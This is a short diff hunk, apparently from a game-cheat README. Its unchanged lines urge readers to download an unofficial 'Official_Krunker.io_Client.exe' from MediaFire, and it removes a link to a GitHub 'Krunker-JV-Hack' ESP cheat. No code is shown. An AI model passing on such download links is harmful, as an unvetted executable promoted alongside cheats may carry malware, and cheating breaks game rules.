@@ -21,8 +21,3 @@ __________________________________
 Click this LINK and Download!
 https://www.mediafire.com/file/offhtbb9g89frem/Official_Krunker.io_Client.exe/file
 __________________________________
-- Need ESP?
-
-|Click this LINK(https://github.com/Krunker-Java-plus-X/Krunker-JV-Hack)|
-|-----------------------------------------------------------------------|
-__________________________________
